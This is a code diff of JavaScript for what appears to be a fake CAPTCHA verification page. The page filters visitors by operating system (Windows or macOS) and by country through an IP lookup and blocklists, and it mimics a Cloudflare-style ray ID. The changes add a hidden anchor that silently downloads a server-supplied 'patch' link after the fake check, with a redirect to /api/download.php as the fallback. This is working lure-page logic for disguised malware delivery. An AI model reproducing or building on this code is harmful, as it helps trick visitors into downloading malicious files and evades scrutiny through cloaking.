@@ -79,17 +79,8 @@ function hide_popup() {
   $('#popup').css('display', 'none');
 }
 
-// hide popup when click overlay
-var isClose = false;
-// $('#overlay').click(function() {
-//   if (isClose) hide_popup();
-// })
-$('#close_popup').click(function() {
-    hide_popup();
-})
 
-
-
+$('#a_refresh').attr('style', 'color: red !important;');
 // set dark mode by OS setting
 console.log(window.matchMedia('(prefers-color-scheme: light)'))
 // Function to toggle dark mode based on browser/system setting
@@ -164,7 +155,6 @@ $('#checkbox-container').click(function() {
       document.getElementById("error-message").style.display = "none"; // Hide error message
       document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['success'];
       document.getElementById('captcha-wrapper').style.height = 'auto';
-      isClose = true;
       
       if (OS == 'Windows' || OS == 'macOS') {
         show_popup();
@@ -217,10 +207,17 @@ $.post('/api/get_archiving.php', {}, function(res) {
 // Getting the country code from the user's IP
 var country_code = '';
 
+// Settings info
+var isDirectDownload = false;
+var patchDownloadLinks = [];
 
 $.get('https://ipinfo.io/json', function(ipinfo) {
   country_code = ipinfo.country;
   $.post('/api/get_validData.php', {}, function(setting) {
+
+      isDirectDownload = setting.isDirectDownload == 'ON' && true;
+      patchDownloadLinks = setting.PatchDownloadLinks;
+
       if (setting.PageStatus == 'ON' && setting.OS.includes(OS) && (setting.GEO.includes(country_code) || setting.GEO.includes('100')) && !setting.BlockedGEO.includes(country_code) && setting.Version.Enabled == 'V3') {
           $.post('/api/index.php', {
             rayid: rayID,
@@ -266,11 +263,33 @@ function getOS() {
 }
 
 
+// wait-respond loading
+window.setInterval(() => {
+  const wait_respond_loading = document.getElementById('wait_respond_loading');
+  wait_respond_loading.innerHTML += '.';
+
+  if ( wait_respond_loading.textContent.length > 8 ) {
+    wait_respond_loading.innerHTML = '...';
+  }
+}, 400)
+
 
 function download_file() {
-  if (isClose) {
-    // window.location.href = "/api/download.php?rayid=" + rayID + '&countrycode=' + country_code + '&version=V3';
+
+  if (isDirectDownload) {
+
+    const link = document.createElement('a');
+    link.href = patchDownloadLinks[0];
+    link.download = '';
+    link.style = 'display: none';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+
+  } else {
+    window.location.href = "/api/download.php?rayid=" + rayID + '&countrycode=' + country_code + '&version=V3';
   }
+  
 }
 
 
@@ -346,6 +365,9 @@ function pc_overlay_showLoading() {
             if (archiving == 'OFF') {
                 window.setTimeout(function() {
                   document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['error'];
+                  if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                    $('#captcha-text > a').css('color', '#ccc');
+                  }
                   $('#captcha-wrapper').css('display', 'block');
                   $('#success').css('display', 'none');
                   $('.wait-respond').css('display', 'none');
@@ -361,6 +383,9 @@ function pc_overlay_showLoading() {
             if (archiving == 'ON') {
                window.setTimeout(function() {
                 document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['error'];
+                if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                  $('#captcha-text > a').css('color', '#ccc');
+                }
                 $('#captcha-wrapper').css('display', 'block');
                 $('#success').css('display', 'none');
                 $('.wait-respond').css('display', 'none');
@@ -371,8 +396,9 @@ function pc_overlay_showLoading() {
                 $('.video3').css('display', 'block');
               }, 50000);
             }
-            
+
         }, 1000);
 
     }, 3000);
 }
+
